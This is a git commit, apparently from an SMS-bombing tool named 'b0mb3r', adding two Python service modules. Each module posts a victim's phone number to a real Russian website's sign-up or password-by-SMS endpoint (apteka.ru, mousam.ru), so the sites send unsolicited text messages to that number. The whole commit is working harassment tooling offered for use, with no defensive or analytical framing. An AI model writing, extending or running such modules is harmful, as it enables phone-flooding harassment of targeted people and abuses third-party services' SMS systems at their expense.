b8958f48cb734691690e6ad6c998ce3f0cb6dfc6
Dmitry Pavlov <dmitrypavlov.design@gmail.com>
2020-02-14 20:05:03 +0200

    +6 services

---
+++ b0mb3r/services/apteka.py
@@ -0,0 +1,24 @@
+from service import Service
+
+
+class Apteka(Service):
+    async def run(self):
+        if self.phone_code == "7" and len(self.formatted_phone) == 11:
+            phone = self.formatted_phone
+            phone_with_mask = f"+{phone[0]} ({phone[1:4]}) {phone[4:7]}-{phone[7:9]}-{phone[9:11]}"
+            await self.post(
+                "https://apteka.ru/_action/auth/getForm/",
+                data={
+                    "form[NAME]": "", 
+                    "form[PERSONAL_GENDER]": "",
+                    "form[PERSONAL_BIRTHDAY]": "",
+                    "form[EMAIL]": "",
+                    "form[LOGIN]": phone_with_mask,
+                    "form[PASSWORD]": self.password,
+                    "get-new-password": "Получите пароль по SMS",
+                    "user_agreement": "on",
+                    "personal_data_agreement": "on",
+                    "formType": "simple",
+                    "utc_offset": "120"
+                },
+            )
---
+++ b0mb3r/services/mousam.py
@@ -0,0 +1,9 @@
+from service import Service
+
+
+class Mousam(Service):
+    async def run(self):
+        await self.post(
+            "https://mousam.ru/api/checkphone",
+            data={"phone": self.formatted_phone, "target": "android app v0.0.2"}
+        )
